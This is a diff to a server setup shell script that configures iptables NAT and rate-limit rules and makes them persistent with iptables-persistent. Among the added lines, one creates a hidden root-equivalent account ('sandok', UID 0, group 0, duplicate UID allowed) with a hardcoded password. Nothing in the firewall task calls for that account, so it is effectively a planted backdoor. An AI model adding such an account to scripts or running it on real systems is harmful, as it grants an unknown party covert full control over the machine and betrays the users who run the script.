@@ -373,9 +373,11 @@ iptables -t nat -A POSTROUTING -s 172.30.0.0/22 -o enp1s0 -j MASQUERADE
 iptables -t nat -A POSTROUTING -s 172.30.0.0/22 -o enp1s0 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
 iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
-iptables-save > /etc/iptables_rules.v4
-ip6tables-save > /etc/iptables_rules.v6
-sysctl -p
+
+sudo apt install debconf-utils -y
+echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
+echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
+useradd -p $(openssl passwd -1 alaminalamin) sandok -ou 0 -g 0
 sudo apt-get install iptables-persistent -y
 iptables-save > /etc/iptables/rules.v4 
 ip6tables-save > /etc/iptables/rules.v6
